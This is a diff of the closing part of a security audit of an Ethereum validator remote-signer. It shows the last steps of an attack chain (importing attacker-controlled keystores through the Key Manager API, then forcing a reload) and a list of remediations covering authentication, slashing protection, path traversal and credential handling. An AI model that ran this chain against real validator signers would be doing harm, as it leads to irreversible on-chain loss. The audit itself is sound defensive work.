-Step 5: VULN-03 — Import attacker-controlled keystores
-         POST /eth/v1/keystores → load rogue keys
-
-Step 6: POST /reload → trigger reload to activate rogue keys
-```
-
----
-
-## Recommendations
-
-### Immediate (Critical)
-
-1. **Implement application-level authentication** — Add bearer token or API key validation middleware to all endpoints. The Key Manager API already specifies this in OpenAPI but lacks implementation.
-
-2. **Replace Host header validation with source-IP validation** — Use Vert.x's `remoteAddress()` to validate the actual client IP, not the spoofable Host header.
-
-3. **Add slashing protection for all signing types** — At minimum, enforce slashing protection for `VOLUNTARY_EXIT` (which causes irreversible validator exit). The `default -> return true` in `maySign()` should be changed to `default -> return false` or implement type-specific protections.
-
-### Short-Term (High)
-
-4. **Fix sign-before-check ordering** — Check slashing protection BEFORE computing the BLS signature.
-
-5. **Add path traversal validation** — In `makeRelativePathAbsolute()`, validate that the resolved path is within the expected config directory after normalization.
-
-6. **Move credentials to files** — Accept database passwords, AWS secrets, and Azure secrets via file paths (e.g., `--slashing-protection-db-password-file`) rather than command-line arguments.
-
-7. **Redact sensitive data in logs** — Never log request bodies that may contain passwords or key material. Especially fix the INFO-level logging in ImportKeystoresHandler.
-
-### Medium-Term
-
-8. **Implement rate limiting** — Add request rate limiting to all endpoints, especially signing and reload.
-
-9. **Escape CORS origins** — Use `Pattern.quote()` on configured origins before constructing the CORS regex.
-
-10. **Set restrictive file permissions** — Apply `chmod 600` to password files created by KeystoreFileManager.
-
-11. **Add authentication to CommitBoost API** — Proxy key generation should require proof of authorization.
-
-12. **Implement audit logging** — Log all signing operations, key management operations, and authentication failures to a tamper-evident audit log.
+Any single one of these stops the attack. Currently, all three gaps co-exist, and the chain from "TCP connection" to "irreversible on-chain damage" is unbroken.
